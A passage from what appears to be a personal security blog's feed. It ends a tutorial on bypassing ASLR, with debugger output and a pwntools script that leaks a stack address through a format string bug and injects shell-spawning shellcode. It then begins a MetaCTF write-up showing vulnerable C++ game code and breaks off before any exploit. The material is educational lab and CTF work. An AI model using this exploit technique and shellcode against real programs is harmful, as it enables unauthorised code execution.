   0x0000555555555284 &amp;lt;+319&amp;gt;:   call   0x555555555030 &amp;lt;printf@plt&amp;gt;
   0x0000555555555289 &amp;lt;+324&amp;gt;:   lea    rdi,[rip+0xdb0]        # 0x555555556040
   0x0000555555555290 &amp;lt;+331&amp;gt;:   mov    eax,0x0
   0x0000555555555295 &amp;lt;+336&amp;gt;:   call   0x555555555030 &amp;lt;printf@plt&amp;gt;
   0x000055555555529a &amp;lt;+341&amp;gt;:   mov    rdx,QWORD PTR [rip+0x2d9f]        # 0x555555558040 &amp;lt;stdin@@GLIBC_2.2.5&amp;gt;
   0x00005555555552a1 &amp;lt;+348&amp;gt;:   lea    rax,[rbp-0xe0]
   0x00005555555552a8 &amp;lt;+355&amp;gt;:   mov    esi,0x12c
   0x00005555555552ad &amp;lt;+360&amp;gt;:   mov    rdi,rax
   0x00005555555552b0 &amp;lt;+363&amp;gt;:   call   0x555555555040 &amp;lt;fgets@plt&amp;gt;
   0x00005555555552b5 &amp;lt;+368&amp;gt;:   mov    eax,0x0
   0x00005555555552ba &amp;lt;+373&amp;gt;:   leave
=&amp;gt; 0x00005555555552bb &amp;lt;+374&amp;gt;:   ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Before writing the exploit, an attaker needs to look at the memory addresses that can be leaked off of the stack from the format string vulnerability and discover their offsets from the address that contains the shellcode. In this example, one can set a breakpoint at *main+368 (right after the second call to &lt;code class=&quot;highlighter-rouge&quot;&gt;fgets()&lt;/code&gt;), exploit the format string vulnerability to print out addresses off of the stack, and look at the addresses. The goal here is to find the start of the second buffer and a suitable address leaked off of the stack. Subtracting these two addresses will result in obtaining the offset that is required for the exploit.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  b *main+368
Breakpoint 2 at 0x12b5
gef➤  r
Starting program: /home/nihaal/Desktop/buffers
Enter your input for the first buffer (fmt str vuln): %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
0x5555555596b1.(nil).0x5555555596cf.0x7fffffffdfb0.0x7ffff7fadbe0.0x7fffffffe118.0x100000000.(nil).(nil).(nil).
Enter your input for the second buffer (stack overflow): AAAAAAAAAAAAAAAAAAAAAA

Breakpoint 2, 0x00005555555552b5 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdf40  →  &quot;AAAAAAAAAAAAAAAAAAAAAA\n&quot;
$rbx   : 0x0
$rcx   : 0x00005555555596c7  →  &quot;.%p.%p.\n&quot;
$rdx   : 0x0
$rsp   : 0x00007fffffffdf30  →  0x00007fffffffe118  →  0x00007fffffffe42f  →  &quot;/home/nihaal/Desktop/buffers&quot;
$rbp   : 0x00007fffffffe020  →  0x00005555555552c0  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
$rsi   : 0x00005555555596b1  →  &quot;AAAAAAAAAAAAAAAAAAAAA\n.%p.%p.\n&quot;
$rdi   : 0x00007ffff7fb0680  →  0x0000000000000000
$rip   : 0x00005555555552b5  →  &amp;lt;main+368&amp;gt; mov eax, 0x0
$r8    : 0x00007fffffffdf40  →  &quot;AAAAAAAAAAAAAAAAAAAAAA\n&quot;
$r9    : 0x0
$r10   : 0x0000555555556040  →  &quot;Enter your input for the second buffer (stack over[...]&quot;
$r11   : 0x246
$r12   : 0x0000555555555060  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As one can see above, the fourth value printed out from the stack when exploiting the format string vulnerability is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7fffffffdfb0&lt;/code&gt; in this instance of the process. The second buffer, which is currently in &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt;, starts at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00007fffffffdf40&lt;/code&gt; in the same instance. This means that the fourth value printed out from the format string vulnerability is always going to have an offset of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7fffffffdfb0 - 0x00007fffffffdf40 = 112&lt;/code&gt; bytes. In other words, subtracting 112 bytes from the fourth pointer on the stack will result in the address of the second buffer, which is where the shellcode will be injected.&lt;/p&gt;

&lt;p&gt;Now that the offset is known, it is simple to write a program that exploits the buffer overflow using this calculated address. The only difference between this buffer overflow and a buffer overflow with ASLR turned off is that this buffer overflow does not use a hardcoded address. Instead, this exploit will calculate the address of the shellcode on the spot using the information that was leaked earlier.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Open up the process
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./buffers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PTY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Ignore the first part
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Leak the fourth pointer from the stack
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%4%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# This will directly print out the fourth pointer
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Calculate the address of the buffer that will contain the shellcode
# It should be 112 bytes away from the leaked address
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Generate the shellcode
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x81\xec\x2c\x01\x00\x00\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;nops&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;232&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nops&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Trigger the buffer overflow
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This exploit should work even when ASLR is turned on.&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
          Creating a Basic Heap Allocator
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
          Mining Hero Vulnerabilities
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
          Simple Heap Buffer Overflow
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Address Space Layout Randomization (ASLR) is a modern exploit mitigation technique that Operating Systems typically use to randomize addresses when a process is executed. This is implemented by having the OS change the locations of special areas, such as the base of executable, the heap, the stack, and any libraries that are loaded in memory. Since memory addresses are unpredictable when ASLR is turned on, hardcoded addresses can no longer be used in exploits when ASLR is enabled.</summary></entry><entry><title type="html">Mining Hero Vulnerabilities</title><link href="http://localhost:4000/2020/10/25/mining-hero-vulnerabilities.html" rel="alternate" type="text/html" title="Mining Hero Vulnerabilities" /><published>2020-10-25T00:00:00-04:00</published><updated>2020-10-25T00:00:00-04:00</updated><id>http://localhost:4000/2020/10/25/mining-hero-vulnerabilities</id><content type="html" xml:base="http://localhost:4000/2020/10/25/mining-hero-vulnerabilities.html">&lt;p&gt;&lt;a href=&quot;../../../assets/other/2020-10-25-mining-hero-vulnerabilities/text-game.cpp&quot;&gt;Mining Hero&lt;/a&gt; (click &lt;a href=&quot;../../../assets/other/2020-10-25-mining-hero-vulnerabilities/text-game&quot;&gt;here&lt;/a&gt; for the binary) is a CTF problem I solved when I played in MetaCTF over this weekend. It involves chaining an integer overflow vulnerability with a format string vulnerability in order to obtain the flag. This is my writeup for how I exploited the binary.&lt;/p&gt;

&lt;p&gt;When I compiled the binary, &lt;code class=&quot;highlighter-rouge&quot;&gt;g++&lt;/code&gt; immediately told me that there was a format string vulnerability in the code. This information will become useful later.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;g++ &lt;span class=&quot;nt&quot;&gt;-fno-stack-protector&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Wall&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; text-game text-game.cpp
text-game.cpp: In &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘void purchase&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;’:
text-game.cpp:150:34: warning: operation on ‘tools_left’ may be undefined &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wsequence-point&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
  150 |    &amp;lt;&amp;lt; &lt;span class=&quot;s2&quot;&gt;&quot;now have &quot;&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tools_left +&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; count - 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&quot;s2&quot;&gt;&quot; spare tool&quot;&lt;/span&gt;
      |                      ~~~~~~~~~~~~^~~~~~~~~~~~~
text-game.cpp:161:41: warning: suggest parentheses around comparison &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;operand of ‘&amp;amp;’ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wparentheses&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
  161 |   bool god_is_happy &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; rand&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &amp;amp; 0xFFFFFF &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      |                                ~~~~~~~~~^~~~
text-game.cpp:164:22: warning: format not a string literal and no format arguments &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wformat-security&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
  164 |   &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name.c_str&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When I first played the game, I was given four different options.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./text-game 
Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor.
Before we continue, what is your name?
Nihaal
Current funds: $150
Your options are: 
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Selecting option two is the only reliable way to make more money. The downside to using this option is that it pauses the program for a moment (by calling the &lt;code class=&quot;highlighter-rouge&quot;&gt;usleep()&lt;/code&gt; function), making it difficult to brute-force the program using only this option.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2
You go to work in the mines
[..........]
[=.........]
[==........]
[===.......]
[====......]
[=====.....]
[======....]
[=======...]
[========..]
[=========.]
[==========]
It was a normal days work. You earned $7. Your balance is now $157.
Current funds: $157
Your options are:
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Option one gives you a chance to double your money.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1
A coin will be flipped. Before the coin is flipped, you may pick heads or tails. If you guess correctly, any money you bet will be doubled. Otherwise, the money will be forfeit. Enter heads, tails, or cancel
heads
How much would you like to bet that the coin will come up heads? Enter a number between 1 and 157.
157
... and the coin came up heads!! You just got $157! Congratulations! Your balance is $314
Current funds: $314
Your options are: 
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Option three is interesting. It allows us to buy various things that could either allow us to mine things faster (encouragement) or get more money while mining (tools). It also includes a &lt;code class=&quot;highlighter-rouge&quot;&gt;shout-out-from-literally-god&lt;/code&gt; option, which costs a huge sum of money.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3
What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
encouragement
How many would you like to buy? Must be greater than 0
1
You can do it! Go you!
You are now very encouraged! Your mining speed has increased.
Current funds: $294
Your options are:
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looking at the &lt;code class=&quot;highlighter-rouge&quot;&gt;purchase()&lt;/code&gt; function in the code, it appears that our goal is to somehow buy the &lt;code class=&quot;highlighter-rouge&quot;&gt;shout-out-from-literally-god&lt;/code&gt; option. However, even if we buy this option, there is still no guarantee that we will get the flag. The function only prints out the flag if &lt;code class=&quot;highlighter-rouge&quot;&gt;rand() &amp;amp; 0xFFFFFF&lt;/code&gt; equals zero, and since there is no way for us to actually control the output of &lt;code class=&quot;highlighter-rouge&quot;&gt;rand()&lt;/code&gt;, there is no way for us to guarantee that we get the flag even after getting a shout out from god.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;purchase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;

    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;shout-out-from-literally-god&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;god_is_happy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFFFFF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;god_is_really_happy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;god_is_happy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hmmmm&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;You have done well!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Good job!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;god_is_really_happy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I'm feeling generous right now!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Have a flag!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifstream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flag.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;istreambuf_iterator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
				                 &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;istreambuf_iterator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Sincerely,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;~God&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When looking at this block of code, one thing that I thought was strange was that the programmer made a function pointer called &lt;code class=&quot;highlighter-rouge&quot;&gt;bool* god_is_really_happy&lt;/code&gt;. The first question that popped into my mind was, “What was the point of making this pointer?” It seems pretty much useless since the programmer could have just used &lt;code class=&quot;highlighter-rouge&quot;&gt;god_is_happy&lt;/code&gt; in place of &lt;code class=&quot;highlighter-rouge&quot;&gt;*god_is_really_happy&lt;/code&gt; in the if statement.&lt;/p&gt;

